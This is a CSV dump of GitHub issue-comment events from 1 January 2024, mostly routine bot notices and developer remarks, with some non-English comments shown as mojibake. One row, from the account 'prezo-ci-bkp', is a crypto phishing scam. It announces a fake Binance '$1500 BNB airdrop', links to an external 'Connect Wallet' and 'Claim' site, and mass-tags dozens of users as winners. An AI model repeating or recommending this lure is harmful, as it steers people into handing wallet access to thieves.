id,type,created_at,actor.login,repo.name,payload.issue.number,payload.action,payload.comment.body
34499806825,IssueCommentEvent,2024-01-01T10:00:11Z,cocogitto-bot[bot],ecsact-dev/unity-ecsact-wasm-bazel-template,15.0,created,:heavy_check_mark: 739ab8c5efb9d56ea5d312f56e0600336c945c53 - Conventional commits check succeeded.
34499806856,IssueCommentEvent,2024-01-01T10:00:11Z,kubevirt-bot,kubevirt/hyperconverged-cluster-operator,2707.0,created,"[APPROVALNOTIFIER] This PR is **NOT APPROVED**

This pull-request has been approved by:
**Once this PR has been reviewed and has the lgtm label**, please ask for approval from [nunnatsa](https://github.com/nunnatsa). For more information see [the Kubernetes Code Review Process](https://git.k8s.io/community/contributors/guide/owners.md#the-code-review-process).

The full list of commands accepted by this bot can be found [here](https://go.k8s.io/bot-commands?repo=kubevirt%2Fhyperconverged-cluster-operator).

<details open>
Needs approval from an approver in each of these files:

- **[OWNERS](https://github.com/kubevirt/hyperconverged-cluster-operator/blob/release-1.10/OWNERS)**

Approvers can indicate their approval by writing `/approve` in a comment
Approvers can cancel approval by writing `/approve cancel` in a comment
</details>
<!-- META={""approvers"":[""nunnatsa""]} -->"
34499807168,IssueCommentEvent,2024-01-01T10:00:12Z,Syrup,Miouwn/upl,5209.0,created,"**Resolved:** Ye is back up in [`f014782`](https://github.com/Miouwn/upl/commit/f0147823ca79f9a38b198f1383fa4c267f4a689a
) after 8 minutes."
34499807477,IssueCommentEvent,2024-01-01T10:00:14Z,elee1766,caddyserver/caddy,5833.0,created,"sounds good, and done. "
34499807594,IssueCommentEvent,2024-01-01T10:00:15Z,dependabot[bot],extrawurst/gitui,1996.0,created,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. You can also ignore all major, minor, or patch releases for a dependency by adding an [`ignore` condition](https://docs.github.com/en/code-security/supply-chain-security/configuration-options-for-dependency-updates#ignore) with the desired `update_types` to your config file.

If you change your mind, just re-open this PR and I'll resolve any conflicts on it."
34499807644,IssueCommentEvent,2024-01-01T10:00:15Z,leck995,brianhsu/Live2DForScala,3.0,created,æ˜¯çš„ï¼Œæ„Ÿè¬è¾›è‹¦ä¿®è¤‡ã€‚
34499807697,IssueCommentEvent,2024-01-01T10:00:15Z,dependabot[bot],reactserbia/uplatnica,156.0,created,Superseded by #166.
34499807874,IssueCommentEvent,2024-01-01T10:00:16Z,renovate[bot],ecomplus-stores/caioorfanelli,44.0,created,"### Edited/Blocked Notification

Renovate will not automatically rebase this PR, because it does not recognize the last commit author and assumes somebody else may have edited the PR.

You can manually request rebase by checking the rebase/retry box above.

 âš  **Warning**: custom changes will be lost."
34499807960,IssueCommentEvent,2024-01-01T10:00:17Z,codecov[bot],enonic/starter-tsup,394.0,created,"## [Codecov](https://app.codecov.io/gh/enonic/starter-tsup/pull/394?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic) Report
All modified and coverable lines are covered by tests :white_check_mark:
> Comparison is base [(`8d6cc1c`)](https://app.codecov.io/gh/enonic/starter-tsup/commit/8d6cc1c1aea486cff77118d951e607ae387eb125?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic) 7.88% compared to head [(`4a07602`)](https://app.codecov.io/gh/enonic/starter-tsup/pull/394?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic) 7.88%.


<details><summary>Additional details and impacted files</summary>


```diff
@@          Coverage Diff          @@
##            main    #394   +/-   ##
=====================================
  Coverage   7.88%   7.88%           
=====================================
  Files         25      25           
  Lines       1142    1142           
  Branches      33      33           
=====================================
  Hits          90      90           
  Misses      1030    1030           
  Partials      22      22           
```



</details>

[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/enonic/starter-tsup/pull/394?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic).   
:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic).
"
34499807967,IssueCommentEvent,2024-01-01T10:00:17Z,Yh010,aadeshkulkarni/sanchay-ai-frontend,2.0,created,"@aadeshkulkarni what if we add a default landing page, which contains a ""get started "" button, which when clicked will redirect to the login process, and upon successful login, the user is redirected to his dashboard?

Something of this sort: https://rxresu.me/"
34499808136,IssueCommentEvent,2024-01-01T10:00:18Z,height[bot],itsbrex/AbletonOSC,1.0,created,"> Link [Height](https://height.app/d7s6_Dxw5A) tasks by mentioning a task ID in the pull request title or commit messages, or description and comments with the keyword `link` (e.g. ""Link T-123"").
>
> ğŸ’¡Tip: You can also use ""Close T-X"" to automatically close a task when the pull request is merged.
<!-- Sent by Height -->"
34499808151,IssueCommentEvent,2024-01-01T10:00:18Z,SMillerDev,Homebrew/homebrew-core,158667.0,created,"> I'd like bash formula to have the homebrew ncurses as an dependency, be compiled against it.

You can make a pull request, but since homebrew prefers to build against system tools on macOS I don't think this will be favoured over the current approach."
34499808544,IssueCommentEvent,2024-01-01T10:00:20Z,kamiyadm,linuxdeepin/linglong-hub,1755.0,created,desktopç¼ºå¤±icon
34500357566,IssueCommentEvent,2024-01-01T11:00:00Z,Levuk0,Giftedbulldozer/Mouse-Auto-Scroll,1.0,created,"it is down, i'll compile it later and send it "
34500357611,IssueCommentEvent,2024-01-01T11:00:00Z,netlify[bot],HarshKhaiwal/MyObsidian,4.0,created,"### <span aria-hidden=""true"">ğŸ‘·</span> Deploy Preview for *zorojuro* processing.


|  Name | Link |
|:-:|------------------------|
|<span aria-hidden=""true"">ğŸ”¨</span> Latest commit | 37c66d6265ac51ceda82a94db444a74970ee39d5 |
|<span aria-hidden=""true"">ğŸ”</span> Latest deploy log | https://app.netlify.com/sites/zorojuro/deploys/65929b04c1c777000881b596 |"
34500357686,IssueCommentEvent,2024-01-01T11:00:01Z,dependabot[bot],sls-reference-architectures/ddb-transactions,75.0,created,Superseded by #77.
34500357817,IssueCommentEvent,2024-01-01T11:00:02Z,maryjaf,Giveth/giveth-dapps-v2,3393.0,created,"
- [ ] Add solana in create project  page-- Pass
- [ ] Add solana in edit project page -- Pass
- [ ] add solana in manage address modal (my project list) -- Code Review "
34500358044,IssueCommentEvent,2024-01-01T11:00:03Z,burdoto,Mineaurion/Aurionchat,25.0,created,"could it be that your rabbitmq impl is fetching Vhost based on connection parameters? (domain, servername, etc?)
as mentioned this is my first time using rabbitmq so it could as well be a configuration issue.
i am not aware of way to test rabbitmq"
34500358080,IssueCommentEvent,2024-01-01T11:00:03Z,dependabot[bot],njoguamos/gikuyu,125.0,created,"Looks like autoprefixer is up-to-date now, so this is no longer needed."
34500358353,IssueCommentEvent,2024-01-01T11:00:04Z,fuergaosi233,fuergaosi233/wereadwise,7.0,created,Thanks for your work ğŸ™
34500358686,IssueCommentEvent,2024-01-01T11:00:05Z,dependabot[bot],mliradelc/opencast,1153.0,created,Superseded by #1196.
34500358815,IssueCommentEvent,2024-01-01T11:00:06Z,dependabot[bot],microsoft/vscode-autopep8,210.0,created,Superseded by #221.
34500358932,IssueCommentEvent,2024-01-01T11:00:07Z,dependabot[bot],w3c/aria-practices,2878.0,created,Superseded by #2895.
34500358955,IssueCommentEvent,2024-01-01T11:00:07Z,Shallowmallow,haxeui/haxeui-core,561.0,created,"OKay I'm satisfied with it. I put some  kind of arbitrary number (5)  to limit the precision.  if a float is too precise, when multiplied and converted to int it causes problems ( I mean when 0.0006 is converted to 6). I don't know how to call it so didn't static inline it  ( yes bad) .
I think it was the best limit I found, but maybe there is a way to calculate it ?"
34500359028,IssueCommentEvent,2024-01-01T11:00:07Z,CasperH2O,Valkirie/HandheldCompanion,916.0,created,Fixed in next EA. ADLX blocked threads.
34500359501,IssueCommentEvent,2024-01-01T11:00:09Z,nielsvanvelzen,jellyfin/jellyfin-androidtv,3271.0,created,"We will not add support for media sessions in the old playback code. The metadata of items is incomplete and it will not work when using the LibVLC backend in the implementation of this PR.

Besides, media session support is already a thing with the new backend which is actively being worked on."
34500359591,IssueCommentEvent,2024-01-01T11:00:09Z,dependabot[bot],Crystal-Creations-GbR/pulsating-circle,120.0,created,Superseded by #143.
34500359736,IssueCommentEvent,2024-01-01T11:00:10Z,prezo-ci-bkp,AlexiaChen/AlexiaChen.github.io,138.0,created,"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!

Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!

[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)

## Steps to Claim:

### 1. Connect Your Binance Wallet:
   - Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
   - Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).

### 2. Interact with the Contract:
   - Once your wallet is connected.
   - Click on the ""**Claim**"" button to interact with the smart contract.

Don't miss out on your $1500 in BNB! Act now to secure your tokens.


Winners: @jomix, @JoaoMirandaXP, @patryk-kozak-branch, @MeralSilviusKarga, @sngyai, @polopek69, @Yelsiw, @JoachimFrydenlund, @jbalatero, @F-Dupraz, @tsz61, @kfihihc, @yuriykuntsyak, @bekha-io, @adrianocr, @Butters3388214, @rl3250, @altitude, @felipefrizzo, @nikitavoloboev, @paulfurber, @hero5512, @sbusso, @agucova, @nunoedgar-invest, @RXWatcher, @kissgyorgy, @sprayogo, @a-dwarf, @y0sh1, @sinamoradi, @stratolark, @jtb87, @rririanto, @zhongyin, @maiph, @dlazares, @cloverzrg, @dazoe, @hmert, @istlf, @Al1rios, @tongxiaofeng, @wpank, @FrederickNgoiya, @codefever, @grojef, @askmetoo, @PirataMorgan, @mahlombe"
34500359972,IssueCommentEvent,2024-01-01T11:00:11Z,dependabot[bot],ipfs/helia-unixfs,136.0,created,Superseded by #146.
34500359981,IssueCommentEvent,2024-01-01T11:00:11Z,stackblitz[bot],luckylennoxll/hint,395.0,created,"<a href=""https://stackblitz.com/~/github.com/luckylennoxll/hint/pull/395""><img src=""https://developer.stackblitz.com/img/review_pr_small.svg"" alt=""Review PR in StackBlitz Codeflow"" align=""left"" width=""103"" height=""20""></a> _Run & review this pull request in [StackBlitz Codeflow](https://stackblitz.com/~/github.com/luckylennoxll/hint/pull/395)._
"
34500360018,IssueCommentEvent,2024-01-01T11:00:11Z,brillout,brillout/telefunc,95.0,created,"Correct me if I'm wrong but I think it works if you set `config.root` to the project root directory of your *client-side*, i.e. to `'/Users/pencilcheck/Projects/project-new-expo/apps/expo/src/'`.

Actually, I don't think setting `config.root` to the monorepo root `'/Users/pencilcheck/Projects/project-new-expo/apps/expo/'` works; I expect an error like/similar to the one you posted in your other issue.

I'll improve the docs to clarify that.

(Unrelated but I recommend following https://telefunc.com/event-based.)"
34500360078,IssueCommentEvent,2024-01-01T11:00:12Z,dependabot[bot],ipfs/public-gateway-checker,508.0,created,Superseded by #510.
34500360080,IssueCommentEvent,2024-01-01T11:00:12Z,mocodesmo,SatoshiPortal/bullbitcoin-mobile,225.0,created,"fixed on main 
this was initially done because long pressing and pasting directly into the textfield would keep the keyboard onscreen"
34500360092,IssueCommentEvent,2024-01-01T11:00:12Z,netlify[bot],scipy/scipy.org,551.0,created,"### <span aria-hidden=""true"">ğŸ‘·</span> Deploy Preview for *scipy-org* processing.


|  Name | Link |
|:-:|------------------------|
|<span aria-hidden=""true"">ğŸ”¨</span> Latest commit | 1683e088e1ed8cd5a7e3a907955ee1adaa338412 |
|<span aria-hidden=""true"">ğŸ”</span> Latest deploy log | https://app.netlify.com/sites/scipy-org/deploys/65929b2b13c2d80008d8fe3e |"
34500360185,IssueCommentEvent,2024-01-01T11:00:12Z,dependabot[bot],luckylennoxll/hint,180.0,created,Superseded by #395.
34500360188,IssueCommentEvent,2024-01-01T11:00:12Z,dependabot[bot],phamduylong/truong-anh-ngok-quotes,60.0,created,Superseded by #63.
34500360267,IssueCommentEvent,2024-01-01T11:00:13Z,iamogbz,iamogbz/webpack-compiler-plugin,2016.0,created,@dependabot merge
34500360465,IssueCommentEvent,2024-01-01T11:00:14Z,radek8,bigtreetech/SKR-3,57.0,created,"If Touch Mode works for you, you don't need Marlin Mode. 
I haven't used Marlin mode in over a year. 
"
34500360566,IssueCommentEvent,2024-01-01T11:00:14Z,Esword618,jinzhongmin/goncnn-examples,1.0,created,"ä¸‹é¢æ˜¯æˆ‘ç”¨yolov5è®­ç»ƒçš„æ¨¡å‹ï¼Œä½†æ˜¯æˆ‘åœ¨ä½¿pnnxè½¬åŒ–ä¸ºncnnçš„æ¨¡å‹åï¼Œä½¿ç”¨ä½ çš„yolov5s-exmpleçš„ä¾‹ç¨‹è°ƒç”¨æˆ‘çš„æ¨¡å‹è¿›è¡Œè¯†åˆ«ï¼Œå‘ç°æœ‰æŠ¥é”™ï¼Œå¤§ä½¬å¯ä»¥å¸®å¿™çœ‹çœ‹å—ï¼Œè¿™ä¸ªå¯¹äºæˆ‘æœ‰ç‚¹éš¾åº¦ï¼Œä¸çŸ¥é“æ€ä¹ˆå…¥æ‰‹ã€‚
ä¸‹é¢æ˜¯æŠ¥é”™ï¼š
```
panic: runtime error: slice bounds out of range [:2008210] with capacity 277200

goroutine 66 [running]:
main.main.func1(0xc2e87c?, 0x6270)
        E:/goproject/src/goncnn-examples/defect-identification/main.go:99 +0x288
github.com/anthonynsimon/bild/parallel.Line.func1()
        E:/goproject/src/pkg/mod/github.com/anthonynsimon/bild@v0.13.0/parallel/parallel.go:33 +0x55
created by github.com/anthonynsimon/bild/parallel.Line in goroutine 1
        E:/goproject/src/pkg/mod/github.com/anthonynsimon/bild@v0.13.0/parallel/parallel.go:31 +0xa5
panic: runtime error: slice bounds out of range [:1472710] with capacity 277200
```
[defect-identification.zip](https://github.com/jinzhongmin/goncnn-examples/files/13804288/defect-identification.zip)
"
34500360732,IssueCommentEvent,2024-01-01T11:00:15Z,moa1128,oneMonthProject/Front,103.0,created,"Refresh token ì„ ì¬ë°œê¸‰ í•˜ëŠ” api ëŠ” ì‹¤í–‰ë˜ì§€ë§Œ Cookie header ì— null ì´ ë“¤ì–´ê° (ì›ë˜ëŠ” í˜„ì¬ ì¡´ì¬í•˜ëŠ” ì¿ í‚¤ë¥¼ ë¸Œë¼ìš°ì €ê°€ Cookie ë¡œ ì „ë‹¬)
header ì— Cookie ë¥¼ ë”°ë¡œ ì„¤ì •í•´ì£¼ë©´ ë“¤ì–´ê°€ì§€ë§Œ Set-Cookie ë¡œ ë‹¤ì‹œ ì„¤ì •í•´ì¤€ Refresh token ì´ ë¸Œë¼ìš°ì € ì¿ í‚¤ì— ì €ì¥ë˜ì§€ ì•ŠìŒ
ìœ„ì™€ ê°™ì€ í˜„ìƒì€ SSR ì—ì„œë§Œ ë°œìƒ.. ë¡œê·¸ì¸ ì²˜ëŸ¼ SSR ë¡œ êµ¬í˜„í•˜ì§€ ì•Šì•˜ì„ ë•Œì—ëŠ” Request Cookie header ì™€ Response Set-Cookie ì— ì˜ ë“¤ì–´ê°€ê³  ë¸Œë¼ìš°ì € ì¿ í‚¤ì—ë„ ì˜ ì €ì¥ì´ ë¨"
34500360761,IssueCommentEvent,2024-01-01T11:00:15Z,dependabot[bot],mliradelc/opencast,1163.0,created,Superseded by #1197.
34500360853,IssueCommentEvent,2024-01-01T11:00:16Z,dependabot[bot],cooldev900/chrome-extension-for-textnow,26.0,created,Superseded by #38.
34500361002,IssueCommentEvent,2024-01-01T11:00:17Z,Tymnspayce,The-MindSpace/MindSpace-Web,11.0,created,"Just Fixed the Navbar List item order in dashboard webpage and many more items.

![image](https://github.com/The-MindSpace/MindSpace-Web/assets/138722584/6780af9d-19e4-446e-826e-06c6ccd54f50)

"
34500361090,IssueCommentEvent,2024-01-01T11:00:17Z,dependabot[bot],joffrey-bion/kotlin-blueprintjs,70.0,created,Superseded by #71.
34500361099,IssueCommentEvent,2024-01-01T11:00:17Z,dependabot[bot],gear-foundation/dapps,187.0,created,"Looks like these dependencies are updatable in another way, so this is no longer needed."
34500361184,IssueCommentEvent,2024-01-01T11:00:18Z,dependabot[bot],libp2p/js-libp2p-delegated-content-routing,169.0,created,Superseded by #175.
